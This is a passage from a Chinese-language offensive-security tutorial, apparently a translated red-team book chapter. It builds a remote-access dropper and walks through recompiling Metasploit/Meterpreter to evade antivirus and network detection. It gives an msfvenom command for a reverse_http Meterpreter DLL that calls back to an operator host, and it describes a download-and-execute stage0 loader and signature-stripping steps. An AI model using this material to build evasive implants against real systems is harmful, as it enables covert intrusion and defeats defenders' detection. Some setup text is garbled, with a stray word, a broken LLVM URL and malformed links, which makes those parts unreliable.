  \ Shellcode（移除引号、换行符和任何非 Shellcode 内容）。\n* 启动服务器：`./thpd ./shellcode.txt 0`\n\n\
  ### 用于 DLL 载荷：\n\n* `msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST=<Your_IP>\
  \ LPORT=<PORT> EnableStageEncoding=True -f dll > msf.dll`\n* 启动服务器：`./thpd ./msf.dll\
  \ 1`\n\n## 客户端\n\n客户端的功能与服务器类似，它会为每种消息类型注册一个处理器。在启动时，它将尝试回连到服务器，如果在 n 次尝试后无法连接或在断开连接时，将重连并发送一条消息请求加载\
  \ Blob。服务器将返回一个`BLOB_PACKET`，客户端将识别并通过`head->msg`字段进行分发。所有数据包必须在开始处定义 `HEAD_PACKET`\
  \ 字段，否则网络处理器将无法识别并将其丢弃。使用`BuildPacketAndSend()`函数将正确设置头数据包，允许另一方对其进行解码。\n\n构建客户端需要\
  \ Visual Studio 和 Git。首先克隆 Git 仓库（https://github.com/cheetz/thpDropper.git）到文件夹中，然后在\
  \ Visual Studio 中打开 `thpDropper.sln`。确保已为正在投送的代码设置正确的架构，如果不想看到任何调试消息，请将其设置为发布版本构建。完成此操作后，按\
  \ F7，Visual Studio 应该会为您生成可执行文件。\n\n## 配置客户端和服务器\n\n大部分客户端的配置均可在 `globals.cpp`文件中访问，您想要更改的三个主要配置设置是主机名、端口和包持续时间（packet\
  \ duration）。每个配置项旁边都有注释，告诉您它们是什么。虽然您不需要更改包签名，但更改它将修改发送的每个数据包的前 2 个字节，这些字节用于识别它是服务器上的有效连接。如果您想混淆\
  \ IP 和端口，可以编写代码在访问时解密它们，并仅在二进制文件中存储加密版本。\n\n在服务器端，在 `main.cpp`文件中，您可以修改服务器监听的端口。此配置在主函数中作为`StartupNetworking()`的唯一参数。如果您决定更改客户端中的包签名，则需要修改服务器以反映这一点。这意味着在`include/lib/networking.h`中，`PACKET_SIGNATURE`值必须匹配客户端中的全局值。\n\
  \n## 添加新处理器\n\n网络代码基础架构设置允许您轻松添加新功能。为此，您需要创建一个回调函数，在客户端上原形为 `void name()`，或在服务器端为\
  \ `void name(int conn)`。这些将被注册到您的消息类型的处理器数组中，并且在头数据包经过验证后，它们将被调用。在这些函数中由您负责从接收缓冲区读取您的数据包和数据。您希望将`recv()`\
  \ 调用到指向数据包结构的指针上，连同该数据包的大小。这将提供有关需要从接收缓冲区拉取多少字节的信息。在此示例中，您将看到我们在使用处理器读取 `BLOB_PACKET`\
  \ 时，使用了存储在 `packet.payloadLen` 中的值来决定需要进一步读取多少字节。相同的原则可以应用于其他数据类型。如果您想发送一个包含受害者计算机上某个文件路径的字符串，您将在处理器的数据包中包含一个描述该字符串长度的字段，您会在数据包之后发送它。\n\
  \n## 进一步练习\n\n\n\n\n\n虽然此代码能为您提供坚实的基础，但仍有多种方法供您自行改进。在传输层添加简单的加密层将是一件轻而易举的事。您只需创建自己的\
  \ `send`和`recv`包装器，并在调用`send`和`recv`函数之前对其进行解密/加密即可。一种极其简单的方法是使用多字节**XOR 密钥**。虽然这种方法安全性不高，但至少能将您的消息更改得足以避免轻易被识别。另一个练习是扩展`LoadBlobHandler()`\
  \ 函数以添加新的 `LOAD_TYPE`：如果客户端是以管理员身份运行，则加载已签名的驱动程序。这可以通过使用 winapi 调用`CreateService()`和`StartService()`来实现。然而，请注意加载驱动程序需要它位于磁盘上，这会触发文件系统微型过滤器驱动程序将其拾取。\n\
  \n## 重新编译 Metasploit/Meterpreter 以绕过 AV 和网络检测\n\n我真的很想涵盖这个主题。请记住这将稍显进阶，并且在编译过程中您很可能会遇到一些问题。外界有非常丰富且强大的工具（如\
  \ Metasploit/Meterpreter），但每种防病毒和入侵 detection (`NID`) 工具都已为其开发了特征码。我们可以尝试使用 `Shikata\
  \ Ga Nai`对载荷进行模糊化处理并重定向至 HTTPS 通道，但这只能做到这一步为止。任何形式的模糊处理通常都会有一个 stub 签名可供检测：防病毒软件会在内存中搜索特定位置的特定字符串，而网络则会对经过加密的\
  \ HTTPS 连接执行中间人审查。那么我们如何在绕过所有常见保护机制的同时继续使用我们最喜爱的工具呢？让我们以 Metasploit/Meterpreter\
  \ 为例，看看我们可以如何跨越所有这些障碍。我们的目标是绕开二进制文件上的 AV 签名、内存中的 AV 签名以及网络信号特征码。\n\n为了规避所有这些检测方法，我们需要做一些事情：首先，我们需要修改\
  \ Meterpreter 载荷以确保它们在网络和内存中都不会被轻易检测到；其次，我们修改`metsvc`持久化模块以防止其标志防病毒软件；第三，我们用 `Clang`重新编译部分`metsrv`（实际的\
  \ Meterpreter 载荷），以防同样触发反病毒特征码；最后，我们将编写自己的 `stage0` 载荷以下载并执行 Meterpreter，从而绕过所有反病毒程序。\n\
  \n### 使用 Clang 编译 metsrv (Meterpreter 网络服务包装器) 并移除对 metsrv/metsvc-server 的引用\n\n\
  *   [`bit.ly/2H2kaUB`](http://bit.ly/2H2kaUB)\n\n###修改载荷以去除类似 Mimikatz 的字符串\n* http://bit.ly/2IS9Hvl\n\
  \n### 修改反射式 DLL 注入以去除如 ReflectiveLoader 般的字串\n    *   [`bit.ly/2qyWfFK`](http://bit.ly/2qyWfFK)\n\
  \n许多网络产品会在数据通过线路时检测 Meterpreter 的 stage `0` `/1` / `2`加载器。除了模糊化我们的载荷外，我们还可以对实际的壳代码进行模糊化处理。举个例子是遍历所有不同类型的\
  \ Ruby 文件并添加随机**nop 滑道**以避免被检测到：\n* [`bit.ly/2JKUhdx`](http://bit.ly/2JKUhdx)\n\n\
  ### 自定义 Stage0 载荷：\n\n    *   http://bit.ly/2ELYkm8 [http://bit.ly/2ELYkm8]  \n\n\
  # LAB: \n\n在本实验练习中，我们将对我们的修改版 Metasploit/Meterpreter 代码进行重新编译并确认其能够躲避基本的防病毒检测。开始之前，请回顾来自\
  \ Metasploit 的构建环境设置：\n\n*   https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter\n\
  \     *   [`github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter`](https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter)\
  \ \n* https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment\n\
  \     *   [`github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment`](https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment)\n\
  \n### Windows 要求:\n\n* Visual Studio 2013 (`VS2013`) - Community 版即可。安装时必须包含`C/C++\
  \ `\n     *   [Visual Studio 2013](https://visualstudio.microsoft.com/zh-hans/)\
  \ ([Community edition is fine]. Need C/C++) installed with the install. (Need) \n\
  \         **Llama**\n* Windows 下安装的 LLVM 32 位（请在安装 VS 之后安装此程序并确保安装了`LLVM `工具链）-在\
  \ [`releases.llvm.org/download.html`](http://releases.llvm.org/download.html]下载\
  \ LLVM 6 @ http://downloas.llvm.org/dload.html\n* Windows 下安装的 GNU Make (http://gnuwin32.sourceforge.net/packages/make.htm)\
  \ - 确保它在您的路径中，或从其安装位置运行。它已包含在您系统的 path 环境变量中了（如果该程序在系统中安装了的话）。\n**LLVM** \n\n* Git-SCM\
  \ ([git-scm.com](https://git-scm.com/)\n\n## 如何在 Windows 上构建 Metasploit/Meterpreter:\
  \ \n\n首先拉取所有`cyberspacekitten ` 仓库。这些文件已针对您的实验进行了大量修改，但可作为概念验证使用。我们需要先下载框架和所有载荷：\n\
  * [git clone](https://github.com/cyberspacekittens/metasploit-framework) https://github.com/cyberspacekittens/metasploit-framework\
